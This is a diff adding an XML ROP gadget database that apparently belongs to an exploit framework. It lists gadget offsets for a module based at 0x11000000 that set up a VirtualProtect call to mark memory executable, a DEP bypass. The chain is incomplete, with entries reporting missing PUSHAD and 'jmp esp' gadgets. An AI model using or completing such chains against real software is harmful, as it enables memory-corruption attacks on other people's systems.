@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>-1.0-</target>
+  </compatibility>
+
+  <gadgets base="0x11000000">
+    <gadget offset="0x000010a5">POP EBP # RETN  ** ASLR</gadget>
+    <gadget offset="0x000010a5">skip 4 bytes  ** ASLR</gadget>
+    <gadget offset="0x00007591">POP EBX # RETN  ** ASLR</gadget>
+    <gadget value="0x00000201">0x00000201-> ebx</gadget>
+    <gadget offset="0x00015353">POP EDX # RETN  ** ASLR</gadget>
+    <gadget value="0x00000040">0x00000040-> edx</gadget>
+    <gadget offset="0x0000d2f3">POP ECX # RETN  ** ASLR</gadget>
+    <gadget offset="0x00021338">Writable location  ** ASLR</gadget>
+    <gadget offset="0x00016835">POP EDI # RETN  ** ASLR</gadget>
+    <gadget offset="0x00017086">RETN (ROP NOP)  ** ASLR</gadget>
+    <gadget offset="0x0000c778">POP ESI # RETN  ** ASLR</gadget>
+    <gadget offset="0x0000274b">JMP [EAX] </gadget>
+    <gadget offset="0x0000b548">POP EAX # POP EBP # RETN  ** ASLR</gadget>
+    <gadget offset="0x00018030">ptr to VirtualProtect()  ** ASLR</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>
+    <gadget offset="0x00000000">Unable to find ptr to 'jmp esp'</gadget>
+  </gadgets>
+</rop>
+</db>
